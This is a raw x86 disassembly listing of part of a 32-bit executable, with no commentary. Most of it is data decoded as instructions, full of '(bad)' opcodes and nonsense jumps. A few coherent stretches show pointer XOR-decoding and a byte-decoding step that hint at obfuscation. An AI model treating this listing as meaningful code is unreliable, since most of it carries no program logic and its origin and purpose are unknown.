  40658f:	jmp    0x4066bb
  406594:	dec    edx
  406595:	add    bh,BYTE PTR [ebx]
  406597:	cmp    DWORD PTR [ebx-0x43],0x6a
  40659b:	fnsave [eax]
  40659d:	xchg   ebx,eax
  40659e:	mov    al,0xc5
  4065a0:	cmc    
  4065a1:	mov    ds:0x246af4c0,eax
  4065a6:	jl     0x406624
  4065a8:	or     eax,0x837c7c7f
  4065ad:	out    dx,al
  4065ae:	mov    BYTE PTR [ecx],al
  4065b0:	jge    0x4065a4
  4065b2:	imul   ebp,DWORD PTR [edi-0x4],0x6d
  4065b6:	ins    BYTE PTR es:[edi],dx
  4065b7:	repnz cmp DWORD PTR [edx],ebx
  4065ba:	push   esi
  4065bb:	push   ebp
  4065bc:	push   0x8
  4065be:	jbe    0x406608
  4065c0:	sub    ch,ch
  4065c2:	sbb    BYTE PTR [eax],0x43
  4065c5:	sub    dh,BYTE PTR [ecx+0x24300b0a]
  4065cb:	push   ss
  4065cc:	xor    BYTE PTR [ecx+0x2011b607],bl
  4065d2:	cmp    dl,BYTE PTR [edx]
  4065d4:	stos   DWORD PTR es:[edi],eax
  4065d5:	mov    BYTE PTR [esi-0x31],bh
  4065d8:	inc    edi
  4065d9:	add    al,0xa
  4065db:	gs jnp 0x406652
  4065de:	std    
  4065df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4065e0:	(bad)  
  4065e1:	cs leave 
  4065e3:	xchg   DWORD PTR [edx],eax
  4065e5:	inc    ecx
  4065e6:	jmp    0xb7f1:0xe17fb5b
  4065ed:	jmp    DWORD PTR ds:0x47ec2f40
  4065f3:	(bad)  
  4065f4:	lods   al,BYTE PTR ds:[esi]
  4065f5:	je     0x4065fa
  4065f7:	repz in eax,dx
  4065f9:	jmp    0x4b55:0xc2f3c450
  406600:	push   esp
  406601:	dec    eax
  406602:	out    dx,eax
  406603:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406604:	inc    edi
  406605:	das    
  406606:	inc    BYTE PTR [esi+0x4e]
  406609:	and    dl,BYTE PTR ds:0x7114ea71
  40660f:	lahf   
  406610:	aad    0x49
  406612:	mov    ebx,0x10364d7e
  406617:	jbe    0x406644
  406619:	je     0x40662c
  40661b:	and    esi,esp
  40661d:	rcl    BYTE PTR [edx],0xe0
  406620:	outs   dx,DWORD PTR ds:[esi]
  406621:	fimul  WORD PTR [ebp-0x650607a]
  406627:	and    ah,BYTE PTR [ebp+0x4bbe07bc]
  40662d:	aad    0x99
  40662f:	inc    ecx
  406630:	and    DWORD PTR [eax-0x2018c139],edx
  406636:	pop    es
  406637:	sti    
  406638:	pop    edx
  406639:	pop    ds
  40663a:	push   esi
  40663b:	cdq    
  40663c:	mov    edx,0x68953849
  406641:	xchg   ebp,eax
  406642:	jg     0x40666f
  406644:	loopne 0x406672
  406646:	pop    ebx
  406647:	in     eax,0xf2
  406649:	xor    ah,BYTE PTR ds:0x9977c439
  40664f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406650:	cmp    dl,cl
  406652:	loop   0x4066ae
  406654:	ins    DWORD PTR es:[edi],dx
  406655:	and    eax,0x5d50d60f
  40665a:	outs   dx,DWORD PTR ds:[esi]
  40665b:	pop    esp
  40665c:	push   ds
  40665d:	jmp    0x406648
  40665f:	icebp  
  406660:	jae    0x406635
  406662:	je     0x4066b3
  406664:	mov    ds:0x63ede866,eax
  406669:	mov    al,0x2f
  40666b:	lods   eax,DWORD PTR ds:[esi]
  40666c:	or     ah,BYTE PTR [edi]
  40666e:	sbb    cl,ch
  406670:	sub    BYTE PTR [esi+0xcbcdf81],cl
  406676:	fdivr  DWORD PTR [eax+edx*2+0x8d05df0]
  40667d:	and    cl,BYTE PTR [ebp+edi*4-0x62]
  406681:	sub    al,BYTE PTR [ebx+0x6a]
  406684:	jne    0x4066c0
  406686:	push   esi
  406687:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  406689:	adc    DWORD PTR [ebx],ecx
  40668b:	inc    ecx
  40668c:	daa    
  40668d:	stc    
  40668e:	cmp    eax,0xd619b229
  406693:	cmp    eax,0xaff9cb33
  406698:	hlt    
  406699:	retf   
  40669a:	retf   0x551c
  40669d:	pop    ebp
  40669e:	out    0x2b,eax
  4066a0:	mov    ah,0x35
  4066a2:	call   0xc61a:0x764cc60f
  4066a9:	jp     0x4066bf
  4066ab:	sbb    eax,0xd20aebcd
  4066b0:	and    ch,BYTE PTR ds:0x124c1bed
  4066b6:	mov    esi,edx
  4066b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066b9:	add    dh,BYTE PTR [ebp+0xaa05]
  4066bf:	add    BYTE PTR [eax-0x17],dl
  4066c2:	daa    
  4066c3:	add    DWORD PTR [eax],eax
  4066c5:	add    BYTE PTR [ebx],ch
  4066c7:	dec    esp
  4066c8:	into   
  4066c9:	hlt    
  4066ca:	jge    0x4066c2
  4066cc:	jge    0x406731
  4066ce:	fnstenv [edi+0x7eb04a70]
  4066d4:	mov    bh,0x4d
  4066d6:	jnp    0x4066ff
  4066d8:	jl     0x406756
  4066da:	or     eax,0xcd7c7c7f
  4066df:	push   ebp
  4066e0:	jno    0x406693
  4066e2:	dec    eax
  4066e3:	fidiv  WORD PTR [ebp-0x3]
  4066e6:	fwait
  4066e7:	add    DWORD PTR [edi-0x38b6fbb4],eax
  4066ed:	add    BYTE PTR [ebp-0x51263c5c],0x7c
  4066f4:	or     DWORD PTR [ebp-0x311e5887],esp
  4066fa:	lahf   
  4066fb:	in     al,dx
  4066fc:	mov    ah,BYTE PTR [esi+0x73]
  4066ff:	xor    ch,dl
  406701:	push   0x59
  406703:	mov    edi,0xd895d489
  406708:	add    eax,0x37c48111
  40670d:	jb     0x4066a1
  40670f:	jge    0x4066d6
  406711:	mov    ch,0xa6
  406713:	pop    eax
  406714:	pop    es
  406715:	sbb    bl,BYTE PTR [eax-0x7aa313f2]
  40671b:	mov    ch,0x18
  40671d:	in     eax,dx
  40671e:	mov    cl,0xd9
  406720:	mov    BYTE PTR ds:0xe2c0448,al
  406726:	fwait
  406727:	adc    ecx,DWORD PTR [edx+0x74]
  40672a:	and    DWORD PTR [ebx+0x69],0xffffff94
  40672e:	or     cl,BYTE PTR [edx-0x3f]
  406731:	inc    edi
  406732:	shl    DWORD PTR [edi+0x2c5ce33d],0x27
  406739:	jp     0x406756
  40673b:	(bad)  
  40673c:	bnd call 0xd803f824
  406742:	ds push eax
  406744:	loopne 0x406723
  406746:	pop    es
  406747:	jg     0x4066e2
  406749:	jmp    0x47d77fee
  40674e:	imul   eax,DWORD PTR [ecx],0xffffffeb
  406751:	jp     0x406772
  406753:	add    BYTE PTR [ebx],0xfd
  406756:	repz dec eax
  406758:	loop   0x4066f1
  40675a:	xchg   esp,eax
  40675b:	stos   BYTE PTR es:[edi],al
  40675c:	inc    ebx
  40675d:	push   esi
  40675e:	mov    eax,ecx
  406760:	and    dh,BYTE PTR [ebp+0x1c]
  406763:	dec    eax
  406764:	mov    bl,0xe1
  406766:	xor    eax,0xd522fbcd
  40676b:	(bad)
  40676e:	dec    ecx
  40676f:	stos   BYTE PTR es:[edi],al
  406770:	idiv   DWORD PTR [edi-0xe]
  406773:	sbb    BYTE PTR [esi+esi*8],cl
  406776:	mov    ?,esi
  406778:	mov    ?,WORD PTR [edi-0x36873a24]
  40677e:	xchg   edi,eax
  40677f:	xor    al,0xbb
  406781:	jo     0x406801
  406783:	xor    edx,DWORD PTR [ebx+0x7]
  406786:	es repnz or eax,0xd066737a
  40678d:	inc    esp
  40678e:	pop    edx
  40678f:	mov    eax,0xf6d70e5e
  406794:	outs   dx,BYTE PTR ds:[esi]
  406795:	loopne 0x40671b
  406797:	jo     0x4067a8
  406799:	ins    BYTE PTR es:[edi],dx
  40679a:	cli    
  40679b:	adc    dh,BYTE PTR [ecx-0x18]
  40679e:	scas   al,BYTE PTR es:[edi]
  40679f:	fld    QWORD PTR [ecx-0x5f175c9a]
  4067a5:	push   ds
  4067a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4067a7:	xchg   ebx,eax
  4067a8:	outs   dx,DWORD PTR ds:[esi]
  4067a9:	int    0xf9
  4067ab:	jmp    0x40673f
  4067ad:	mov    ebx,0xbbfb091a
  4067b2:	fnsave [eax+ecx*2+0x46337f41]
  4067b9:	mov    ch,0xb7
  4067bb:	rcl    ch,cl
  4067bd:	icebp  
  4067be:	rcl    esp,cl
  4067c0:	dec    esp
  4067c1:	mov    eax,ds:0x62fff987
  4067c6:	jbe    0x4067a2
  4067c8:	in     al,dx
  4067c9:	mov    ebp,0xeadccb90
  4067ce:	in     eax,dx
  4067cf:	cmp    DWORD PTR [edx],0x222df5a2
  4067d5:	jmp    0x406847
  4067d7:	push   ebp
  4067d8:	or     ch,ah
  4067da:	push   0xa8e731ae
  4067df:	pop    ss
  4067e0:	punpckhwd mm2,QWORD PTR [ebx]
  4067e3:	jmp    0x1e188c8c
  4067e8:	aaa    
  4067e9:	xor    esp,DWORD PTR [edx+0x458b7c9b]
  4067ef:	lock mov eax,DWORD PTR [eax+0x198]
  4067f6:	jmp    0x406922
  4067fb:	shr    ecx,cl
  4067fd:	dec    esp
  4067fe:	pop    esi
  4067ff:	pop    edx
  406800:	jns    0x4067e7
  406802:	ins    DWORD PTR es:[edi],dx
  406803:	adc    eax,0xf0a54fb4
  406808:	push   ds
  406809:	ret    0x887
  40680c:	cmp    DWORD PTR [esp+edi*2+0xd],edi
  406810:	jg     0x40688e
  406812:	jl     0x406831
  406814:	int3   
  406815:	aad    0x4c
  406817:	xchg   esi,eax
  406818:	cdq    
  406819:	dec    ebp
  40681a:	mov    esi,DWORD PTR [eax-0x6627e498]
  406820:	imul   edx,DWORD PTR [eax-0x655be78],0x76
  406827:	pop    esp
  406828:	push   es
  406829:	fwait
  40682a:	jg     0x4067f0
  40682c:	cmp    DWORD PTR [ecx-0x519f3661],eax
  406832:	or     BYTE PTR [eax+0x7f945e9f],cl
  406838:	sub    BYTE PTR [esi+0x488ea6c4],0xf5
  40683f:	test   eax,edx
  406841:	jne    0x40684c
  406843:	repnz pop edx
  406845:	adc    ecx,DWORD PTR [ecx+0x63]
  406848:	leave  
  406849:	bound  eax,QWORD PTR [ebp+eiz*8+0x26]
  40684d:	or     BYTE PTR [esi],ch
  40684f:	jnp    0x40682c
  406851:	jbe    0x406836
  406853:	and    edi,DWORD PTR [edx+0x4bd5e8ea]
  406859:	sbb    eax,0xe0cd17ce
  40685e:	sub    ebx,edi
  406860:	out    dx,al
  406861:	jp     0x4068c8
  406863:	mov    bl,cl
  406865:	mov    ch,0x70
  406867:	mov    ebp,ebx
  406869:	jns    0x4068ca
  40686b:	adc    ch,al
  40686d:	imul   esp,DWORD PTR [esi],0x1c
  406870:	mov    bh,0xa5
  406872:	sub    eax,0x5ff037e1
  406877:	mov    ebp,DWORD PTR [edx]
  406879:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40687a:	push   ds
  40687b:	jo     0x406819
  40687d:	iret   
  40687e:	mov    edx,cr6
  406881:	cmp    dl,BYTE PTR [edx-0x1b]
  406884:	adc    al,0xe3
  406886:	leave  
  406887:	imul   eax,DWORD PTR [ecx+0x2bcceb2],0xac90963f
  406891:	retf   0xab78
  406894:	rcl    DWORD PTR [ebp-0x24],cl
  406897:	(bad)  
  406899:	jge    0x406868
  40689b:	xor    edi,0xfffffff0
  40689e:	ja     0x406840
  4068a0:	cmp    eax,DWORD PTR [esi+eiz*2]
  4068a3:	or     DWORD PTR ds:0x7033935e,eax
  4068a9:	outs   dx,BYTE PTR ds:[esi]
  4068aa:	jecxz  0x4068c6
  4068ac:	sub    cl,bh
  4068ae:	mov    edx,ss
  4068b0:	adc    eax,0x7552b5e1
  4068b5:	out    0xdf,al
  4068b7:	imul   ebx,DWORD PTR [edi+0x1],0xe039a405
  4068be:	add    BYTE PTR [edi],dh
  4068c0:	xor    al,0x9a
  4068c2:	(bad)  
  4068c3:	jae    0x406902
  4068c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4068c6:	or     DWORD PTR [esi+0x1dfb36ca],ebx
  4068cc:	out    dx,al
  4068cd:	pop    es
  4068ce:	mov    edi,0x5150c989
  4068d3:	push   ecx
  4068d4:	sbb    al,0xa9
  4068d6:	rol    esp,1
  4068d8:	scas   eax,DWORD PTR es:[edi]
  4068d9:	xchg   edi,eax
  4068da:	push   esp
  4068db:	fiadd  DWORD PTR [esi-0x254df5e9]
  4068e1:	push   ecx
  4068e2:	gs cld 
  4068e4:	repz jge 0x406888
  4068e7:	ins    DWORD PTR es:[edi],dx
  4068e8:	dec    esi
  4068e9:	adc    BYTE PTR [ebx-0x3ecb6a1a],0x7f
  4068f0:	add    cl,al
  4068f2:	dec    edi
  4068f3:	shr    ecx,cl
  4068f5:	enter  0x80de,0x1b
  4068f9:	test   ah,0x89
  4068fc:	std    
  4068fd:	mov    bh,0xc2
  4068ff:	loop   0x4068ef
  406901:	sbb    DWORD PTR [ebx+0x518c4bac],eax
  406907:	xor    ebp,DWORD PTR [edi-0x32]
  40690a:	out    dx,eax
  40690b:	push   0xffffffd0
  40690d:	leave  
  40690e:	pop    ecx
  40690f:	arpl   WORD PTR [esi],bp
  406911:	sar    bh,cl
  406913:	sbb    eax,0xff263d85
  406918:	sbb    BYTE PTR [eax+0x972975e],dh
  40691e:	std    
  40691f:	mov    al,0x5f
  406921:	stos   DWORD PTR es:[edi],eax
  406922:	push   DWORD PTR [eax]
  406924:	call   0x40101c
  406929:	mov    DWORD PTR [ebp-0x8],eax
  40692c:	cmp    DWORD PTR [ebp-0x8],0x0
  406930:	lea    eax,[ebp+0x4]
  406933:	mov    DWORD PTR [ebp-0x20],eax
  406936:	je     0x406fd6
  40693c:	lea    eax,[ebp-0x18]
  40693f:	push   eax
  406940:	mov    eax,DWORD PTR [ebp-0x2c]
  406943:	xor    eax,esi
  406945:	add    eax,edi
  406947:	push   eax
  406948:	mov    eax,DWORD PTR [ebp-0x1c]
  40694b:	xor    eax,esi
  40694d:	add    eax,edi
  40694f:	push   eax
  406950:	push   DWORD PTR [ebp-0x8]
  406953:	lea    eax,[ebp-0x78]
  406956:	push   eax
  406957:	push   DWORD PTR [ebp-0xc]
  40695a:	push   DWORD PTR [ebp-0x14]
  40695d:	call   0x4055ae
  406962:	test   eax,eax
  406964:	je     0x406abb
  40696a:	lea    eax,[ebp-0x78]
  40696d:	push   eax
  40696e:	mov    eax,DWORD PTR [ebp-0x14]
  406971:	xor    eax,esi
  406973:	add    eax,edi
  406975:	push   eax
  406976:	mov    eax,DWORD PTR [ebp-0x10]
  406979:	add    eax,0xee
  40697e:	push   eax
  40697f:	mov    eax,DWORD PTR [ebp-0x10]
  406982:	mov    eax,DWORD PTR [eax+0x198]
  406988:	push   DWORD PTR [eax]
  40698a:	jmp    0x406ab6
  40698f:	xor    BYTE PTR [ecx-0x12922c70],ch
  406995:	mov    bl,0xa9
  406997:	and    BYTE PTR [esi+eax*2-0x22],ch
  40699b:	ja     0x406973
  40699d:	push   eax
  40699e:	dec    esp
  40699f:	sbb    DWORD PTR [eax],edi
  4069a1:	jl     0x406a1f
  4069a3:	or     eax,0xdd7c7c7f
  4069a8:	pop    ds
  4069a9:	(bad)  
  4069ac:	cli    
  4069ad:	xchg   esp,eax
  4069ae:	and    bh,BYTE PTR [ecx-0x1de60f91]
  4069b4:	(bad)  [esi+0x2911565b]
  4069ba:	not    DWORD PTR [ecx-0x756f002e]
  4069c0:	sub    esp,DWORD PTR [ecx-0x44881ed0]
  4069c6:	call   0xe9ec:0x4b80097c
  4069cd:	stos   DWORD PTR es:[edi],eax
  4069ce:	inc    edi
  4069cf:	fistp  QWORD PTR [edi]
  4069d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069d2:	jmp    0x7c0fe87b
  4069d7:	scas   eax,DWORD PTR es:[edi]
  4069d8:	add    bl,BYTE PTR [esi+0x6e8042c]
  4069de:	lods   eax,DWORD PTR ds:[esi]
  4069df:	push   esi
  4069e0:	jp     0x406a36
  4069e2:	mov    ah,0xa9
  4069e4:	ret    
  4069e5:	adc    edx,esp
  4069e7:	and    al,0x45
  4069e9:	gs stc 
  4069eb:	cdq    
  4069ec:	dec    esp
  4069ed:	sti    
  4069ee:	in     eax,0x16
  4069f0:	lds    ebx,FWORD PTR [esi-0x7b]
  4069f3:	addr16 leave 
  4069f5:	pushf  
  4069f6:	or     eax,0x806837ec
  4069fb:	cmp    al,0x8b
  4069fd:	pop    esi
  4069fe:	bound  edx,QWORD PTR [ebp+0x7df516a5]
  406a04:	push   esp
  406a05:	jl     0x406a79
  406a07:	addr16 jnp 0x406a0e
  406a0a:	dec    ebx
  406a0b:	jmp    0x23c28973
  406a10:	mov    ch,dl
  406a12:	xchg   ecx,eax
  406a13:	mov    dh,0x7c
  406a15:	and    BYTE PTR [edx+0x42],dl
  406a18:	ret    0x305c
  406a1b:	outs   dx,BYTE PTR ds:[esi]
  406a1c:	and    al,0xdf
  406a1e:	cmp    eax,0x1456c9d4
  406a23:	xor    al,0xf2
  406a25:	fdivr  st(5),st
  406a27:	jno    0x406a86
  406a29:	jbe    0x4069e5
  406a2b:	adc    al,0xd2
  406a2d:	mov    edi,0x8bb2583
  406a32:	fucom  st(6)
  406a34:	dec    esi
  406a35:	xor    eax,ecx
  406a37:	int    0x82
  406a39:	sbb    eax,0x47b8443
  406a3e:	sbb    eax,0x8d9ea95f
  406a43:	aad    0xec
  406a45:	sbb    al,0x0
  406a47:	int    0x8c
  406a49:	aam    0xe1
  406a4b:	and    al,0xaa
  406a4d:	(bad)  
  406a4e:	out    dx,eax
  406a4f:	repz mov al,0xba
  406a52:	or     ebp,ebx
  406a54:	xor    DWORD PTR [edx-0x28],0x334c2fb9
  406a5b:	jno    0x4069f1
  406a5d:	mov    ebp,0x3c5caec7
  406a62:	fs push ebx
  406a64:	mov    edi,0x4f568276
  406a69:	push   0x58
  406a6b:	(bad)  
  406a6c:	enter  0xc548,0xa0
  406a70:	inc    ebp
  406a71:	in     eax,dx
  406a72:	sbb    DWORD PTR [ebx],0x67037bda
  406a78:	xchg   edi,eax
  406a79:	in     al,0x5c
  406a7b:	push   ebp
  406a7c:	cmp    DWORD PTR [edx+0x62],0xf899057e
  406a83:	dec    eax
  406a84:	outs   dx,BYTE PTR ds:[esi]
  406a85:	or     al,0xbe
  406a87:	cmp    ah,bh
  406a89:	jno    0x406a61
  406a8b:	mov    bl,0x8c
  406a8d:	pop    es
  406a8e:	push   ebx
  406a8f:	ret    0x582
  406a92:	in     eax,dx
  406a93:	pop    es
  406a94:	nop
  406a95:	gs scas al,BYTE PTR es:[edi]
  406a97:	mov    al,0x81
  406a99:	xor    al,0xdc
  406a9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a9c:	sub    ecx,eax
  406a9e:	cmp    ah,BYTE PTR [eax+0x3c2f2673]
  406aa4:	mov    ch,BYTE PTR [eax+ebx*8-0x31]
  406aa8:	std    
  406aa9:	xchg   esp,eax
  406aaa:	ja     0x406ae2
  406aac:	xchg   ebx,eax
  406aad:	addr16 js 0x406b25
  406ab0:	adc    DWORD PTR [ecx],ebp
  406ab2:	gs dec edx
  406ab4:	inc    ebx
  406ab5:	mov    ebx,0xffa561e8
  406aba:	dec    DWORD PTR [ebx-0x31cc1bb3]
  406ac0:	mov    eax,0xffcd8d62
  406ac5:	sub    eax,ecx
  406ac7:	jmp    0x406bf3
  406acc:	or     al,0x53
  406ace:	and    al,0x43
  406ad0:	jnp    0x406b2d
  406ad2:	jnp    0x406b27
  406ad4:	gs ins DWORD PTR es:[edi],dx
  406ad6:	push   esp
  406ad7:	and    BYTE PTR [edi-0x39],ch
  406ada:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406adb:	aam    0x16
  406add:	cmp    edi,DWORD PTR [esp+edi*2+0xd]
  406ae1:	jg     0x406b5f
  406ae3:	jl     0x406b1c
  406ae5:	int    0x5
  406ae7:	fisubr WORD PTR [ebx+0x3fe48f82]
  406aed:	or     ebp,DWORD PTR [edi-0x7487f09c]
  406af3:	pop    esp
  406af4:	or     al,0x9d
  406af6:	adc    dl,BYTE PTR [ebx+edx*2-0x3991ed5e]
  406afd:	push   esp
  406afe:	or     BYTE PTR [edx-0x28],cl
  406b01:	xor    ecx,DWORD PTR [esi]
  406b03:	out    0xf8,eax
  406b05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b06:	pop    edi
  406b07:	sbb    al,dh
  406b09:	pushf  
  406b0a:	dec    edi
  406b0b:	dec    esi
  406b0c:	pusha  
  406b0d:	cmp    esi,eax
  406b0f:	call   0xe1b92c7f
  406b14:	mov    ds,WORD PTR [esi-0x43a359a7]
  406b1a:	push   ss
  406b1b:	cmp    edx,ecx
  406b1d:	dec    eax
  406b1e:	push   esp
  406b1f:	inc    esi
  406b20:	sar    DWORD PTR [ebp+0x175bec07],1
  406b26:	or     eax,0xe26fd733
  406b2b:	mov    cl,0x9d
  406b2d:	(bad)  
  406b2f:	mul    DWORD PTR [edi]
  406b31:	xor    esp,DWORD PTR [esi]
  406b33:	sub    ecx,DWORD PTR [eax+0x6e]
  406b36:	mov    ?,WORD PTR [eax+0x652c41ff]
  406b3c:	rcl    DWORD PTR [edi+0x73],1
  406b3f:	imul   dl
  406b41:	sbb    dl,BYTE PTR [eax+edi*8]
  406b44:	retf   0x8ea4
  406b47:	fild   DWORD PTR [ecx]
  406b49:	fisub  DWORD PTR [eax-0x6b]
  406b4c:	je     0x406b31
  406b4e:	xchg   ebp,eax
  406b4f:	jae    0x406b4c
  406b51:	test   DWORD PTR [ecx+0x62],esi
  406b54:	pop    edi
  406b55:	sbb    ebx,DWORD PTR [edi+edi*1+0x33140705]
  406b5c:	sbb    al,0xdf
  406b5e:	fimul  WORD PTR [ecx+0x48349aa5]
  406b64:	sbb    eax,0xcad449a4
  406b69:	push   esi
  406b6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b6b:	popa   
  406b6c:	hlt    
  406b6d:	aam    0x5f
  406b6f:	lock inc ebp
  406b71:	in     al,0x2f
  406b73:	arpl   dx,cx
  406b75:	cmp    ebx,DWORD PTR [eax]
  406b77:	mov    cl,0xf5
  406b79:	daa    
  406b7a:	ja     0x406bc6
  406b7c:	pushf  
  406b7d:	add    DWORD PTR [edx-0x2f6bf3d6],0x1e
  406b84:	sub    al,dh
  406b86:	mov    dh,bh
  406b88:	cli    
  406b89:	sbb    dh,BYTE PTR [esi]
  406b8b:	inc    eax
  406b8c:	retf   0x455e
  406b8f:	xchg   DWORD PTR [esi],ecx
  406b91:	mov    al,ds:0xb2884ed6
  406b96:	xchg   esp,eax
  406b97:	ins    BYTE PTR es:[edi],dx
  406b98:	add    DWORD PTR ds:[eax-0x59],0x20ac0d8f
  406ba0:	pop    ebp
  406ba1:	stos   BYTE PTR es:[edi],al
  406ba2:	adc    esp,edx
  406ba4:	arpl   WORD PTR [edx],cx
  406ba6:	xor    BYTE PTR [ebx+esi*8],al
  406ba9:	sti    
  406baa:	jno    0x406b5c
  406bac:	or     eax,0x91aeccde
  406bb1:	lea    eax,[edx]
  406bb3:	rcl    BYTE PTR [esi-0x7db64f5b],cl
  406bb9:	add    dh,BYTE PTR [edx]
  406bbb:	in     al,0xd6
  406bbd:	jge    0x406b7a
  406bbf:	jecxz  0x406c0b
  406bc1:	retf   0x56d4
  406bc4:	sbb    DWORD PTR [ecx+0x11],ebp
  406bc7:	iret   
  406bc8:	jne    0x406b7f
  406bca:	jne    0x406b94
  406bcc:	mov    ecx,0xc34463ee
  406bd1:	cmp    DWORD PTR [edx+0x5f],edx
  406bd4:	and    DWORD PTR [edx-0x3b4255db],edi
  406bda:	pop    eax
  406bdb:	ins    DWORD PTR es:[edi],dx
  406bdc:	retf   0x22c0
  406bdf:	shl    DWORD PTR [edx],1
  406be1:	dec    edx
  406be2:	mov    dh,0xb2
  406be4:	add    ch,0xab
  406be7:	pop    ebp
  406be8:	mov    dl,0x81
  406bea:	mov    ebx,0x79956ec6
  406bef:	mov    cl,0xd1
  406bf1:	and    esi,DWORD PTR [ebp-0x7407bad5]
  406bf7:	dec    ebp
  406bf8:	rol    BYTE PTR [ebx],1
  406bfa:	enter  0x27e9,0x1
  406bfe:	add    BYTE PTR [eax],al
  406c00:	xchg   ebp,eax
  406c01:	(bad)  
  406c02:	out    0x14,eax
  406c04:	std    
  406c05:	push   esp
  406c06:	gs popf 
  406c08:	repz mov al,ds:0x262f9e75
  406c0e:	jg     0x406bdc
  406c10:	daa    
  406c11:	cmp    bh,BYTE PTR [esp+edi*2+0xd]
  406c15:	jg     0x406c93
  406c17:	jl     0x406c61
  406c19:	cdq    
  406c1a:	rcr    BYTE PTR [ebp+0x12],1
  406c1d:	jno    0x406c79
  406c1f:	inc    esp
  406c20:	div    edi
  406c22:	inc    esi
  406c23:	fimul  DWORD PTR [edx-0x49d9992]
  406c29:	test   DWORD PTR [edx],edi
  406c2b:	in     eax,dx
  406c2c:	mov    edx,0xf5b5807b
  406c31:	in     eax,dx
  406c32:	cmp    edx,DWORD PTR [ebx]
  406c34:	out    0xbe,eax
  406c36:	or     esi,DWORD PTR [eax]
  406c38:	mov    ebp,0xe5f49fc1
  406c3d:	lds    esp,FWORD PTR [edi+0x597f871b]
  406c43:	daa    
  406c44:	repz xchg esp,eax
  406c46:	popf   
  406c47:	or     esi,0x29
  406c4a:	scas   al,BYTE PTR es:[edi]
  406c4b:	push   ebx
  406c4c:	popa   
  406c4d:	add    al,0xec
  406c4f:	ss jmp 0x95374d20
  406c55:	or     cl,BYTE PTR [esi+eax*8-0x46fb59f2]
  406c5c:	rcl    BYTE PTR [edx],0x50
  406c5f:	mov    dl,0x8d
  406c61:	sub    esp,DWORD PTR [esi+edx*8-0x78af5f66]
  406c68:	cwde   
  406c69:	stos   DWORD PTR es:[edi],eax
  406c6a:	push   ecx
  406c6b:	(bad)  
  406c6c:	push   0x34859a2a
  406c71:	or     eax,0xdf26e254
  406c76:	inc    ebx
  406c77:	fnstsw WORD PTR [eax]
  406c79:	aad    0x6
  406c7b:	hlt    
  406c7c:	pop    edi
  406c7d:	mov    ebx,0x1884b7b8
  406c82:	mov    edi,0x462ae1b9
  406c87:	xchg   edi,eax
  406c88:	xchg   DWORD PTR [esi],eax
  406c8a:	pop    eax
  406c8b:	adc    eax,0x5dd53c6f
  406c90:	fisttp DWORD PTR [ecx]
  406c92:	scas   al,BYTE PTR es:[edi]
  406c93:	adc    edi,DWORD PTR [ebx+0xdb77bd]
  406c99:	pop    ss
  406c9a:	add    ebx,DWORD PTR [edx-0x17]
  406c9d:	cli    
  406c9e:	clc    
  406c9f:	outs   dx,BYTE PTR ds:[esi]
  406ca0:	xchg   esp,eax
  406ca1:	int3   
  406ca2:	outs   dx,DWORD PTR ds:[esi]
  406ca3:	push   ss
  406ca4:	ret    0x83e2
  406ca7:	jle    0x406ca8
  406ca9:	inc    edx
  406caa:	xor    dl,al
  406cac:	push   edx
  406cad:	pop    esp
  406cae:	push   es
  406caf:	mov    ebx,edx
  406cb1:	dec    edi
  406cb2:	shl    BYTE PTR [edx+0x7e471138],cl
  406cb8:	cmp    al,0x2
  406cba:	add    al,0x91
  406cbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406cbd:	loope  0x406c6a
  406cbf:	pop    esi
  406cc0:	out    dx,al
  406cc1:	dec    ebx
  406cc2:	add    dh,BYTE PTR [ebp-0x25]
  406cc5:	repz mov ecx,0x6676802d
  406ccb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ccc:	jbe    0x406c93
  406cce:	xchg   esp,eax
  406ccf:	retf   
  406cd0:	enter  0x9d22,0x2b
  406cd4:	icebp  
  406cd5:	adc    DWORD PTR [edx],ebp
  406cd7:	lock mov ecx,0xe85a7cf4
  406cdd:	pusha  
  406cde:	mov    ebx,0x2a3464f7
  406ce3:	test   DWORD PTR [edx],edi
  406ce5:	out    0xbf,al
  406ce7:	fistp  QWORD PTR [esi-0x68141c22]
  406ced:	fiadd  WORD PTR ds:0x517c4225
  406cf3:	xchg   ecx,eax
  406cf4:	cmp    eax,0x69a6a93d
  406cf9:	aas    
  406cfa:	fstp   TBYTE PTR [eax]
  406cfc:	test   al,0x65
  406cfe:	sbb    eax,0x2a61b050
  406d03:	call   0x7940:0x7130ccc8
  406d0a:	ins    DWORD PTR es:[edi],dx
  406d0b:	(bad)  
  406d0d:	outs   dx,BYTE PTR ds:[esi]
  406d0e:	fcomi  st,st(5)
  406d10:	mov    cl,0x2c
  406d12:	cmp    eax,0xa2a13742
  406d17:	ins    BYTE PTR es:[edi],dx
  406d18:	push   0xffffff99
  406d1a:	adc    ebp,edx
  406d1c:	ffreep st(4)
  406d1e:	mov    ebx,edi
  406d20:	inc    esp
  406d21:	lock fisubr WORD PTR [ecx-0x74c5306a]
  406d28:	inc    ebp
  406d29:	clc    
  406d2a:	mov    DWORD PTR [eax+0x1],ecx
  406d2d:	mov    al,BYTE PTR [ebp-0x1]
  406d30:	mov    ecx,DWORD PTR [ebp-0x8]
  406d33:	xor    al,0x49
  406d35:	sub    al,0x35
  406d37:	mov    BYTE PTR [ecx],al
  406d39:	lea    eax,[ebp-0x8]
  406d3c:	inc    BYTE PTR [eax]
  406d3e:	inc    eax
  406d3f:	push   eax
  406d40:	pop    ecx
  406d41:	dec    ecx
  406d42:	xchg   ecx,edx
  406d44:	dec    BYTE PTR [edx]
  406d46:	push   DWORD PTR [ebp-0x10]
  406d49:	mov    eax,ds:0x43c25c
  406d4e:	mov    eax,DWORD PTR [eax]
  406d50:	push   DWORD PTR [eax]
